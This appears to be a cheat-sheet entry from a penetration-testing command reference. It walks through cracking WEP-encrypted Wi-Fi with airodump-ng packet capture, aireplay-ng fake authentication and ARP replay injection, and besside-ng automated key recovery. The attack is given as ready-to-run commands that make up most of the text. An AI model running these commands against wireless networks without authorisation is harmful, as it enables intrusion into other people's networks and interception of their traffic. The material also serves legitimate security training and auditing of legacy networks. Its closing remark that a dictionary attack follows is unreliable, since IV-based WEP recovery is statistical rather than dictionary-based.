---
title: Attacking WEP with airtools and besside-ng
category: wireless
subcategory: sub-03
os: linux
command: besside-ng --bssid <router_MAC> --channel 10 wlan1
tools: airodump-ng, aireplay-ng, besside-ng
---


## Attacking WEP with airtools

WEP is vulnerable to cryptographic attacks – simply capture a sufficient number of packets containing initialization vectors (IVs) to recover the key. Below is the classic method using the aircrack-ng package.

### Terminal 1: Packet Collection

In the first terminal, we start packet collection. This window must remain open throughout the attack.

Find WEP networks within range:

```bash
airodump-ng --encrypt WEP wlan1
```

Start capturing for a specific network:

```bash
airodump-ng -c <channel> --bssid <router_MAC> -w capture wlan1
```

### Terminal 2: Fake Connection

In the second terminal, we establish a fake connection to the access point. This will make the router accept our packets.

```bash
sudo aireplay-ng -1 0 -a <BSSID> -h <your_MAC> wlan1
```

### Terminal 3: Generating Traffic

The third terminal is used to generate traffic. The ARP replay attack intercepts ARP packets and retransmits them, forcing the router to send replies containing the next IV.

```bash
sudo aireplay-ng -3 -b <BSSID> -h <your_MAC> wlan1
```

### Alternative: besside-ng

If you prefer an all-in-one approach, besside-ng automates the entire process. The tool will perform the attack itself and save the compromised keys to a file.

```bash
besside-ng --bssid <router_MAC> --channel 10 wlan1
```

Now, the dictionary attack remains; search by 'aircrack-ng' query.